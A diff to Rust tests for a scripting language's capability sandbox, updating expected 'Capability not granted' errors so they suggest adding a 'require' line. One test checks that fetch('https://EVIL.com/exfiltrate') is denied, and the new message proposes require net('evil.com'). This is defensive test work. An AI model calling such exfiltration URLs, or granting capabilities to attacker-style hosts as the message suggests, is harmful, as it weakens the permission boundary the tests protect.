@@ -27,14 +27,14 @@ fn secure_read_file_without_capability_is_violation() {
 #[test]
 fn capability_violations_exact_strings() {
     let r = run_source("let c be read_file(\"/tmp/x.txt\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\")"]);
+    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
 
     let r = run_source("write_file(\"/tmp/x.txt\", \"hi\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_write(\"/tmp/x.txt\")"]);
+    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_write(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.write(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
 
     // fetch: el scope es el hostname del URL (no el URL completo), en minúsculas.
     let r = run_source("let r be fetch(\"https://EVIL.com/exfiltrate\")", "<t>");
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: net(\"evil.com\")"]);
+    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: net(\"evil.com\") — this is a permission, not a bug: add `require net(\"evil.com\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
 }
 
 #[test]
@@ -43,7 +43,7 @@ fn require_net_does_not_cover_file() {
         "require net(\"example.com\")\nlet c be read_file(\"/tmp/x.txt\")",
         "<t>",
     );
-    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\")"]);
+    assert_eq!(r.errors, vec!["Runtime error: Capability not granted: file_read(\"/tmp/x.txt\") — this is a permission, not a bug: add `require file.read(\"/tmp/x.txt\")` to the program's preamble (or to the importing file, when this code runs in a module)"]);
 }
 
 #[test]
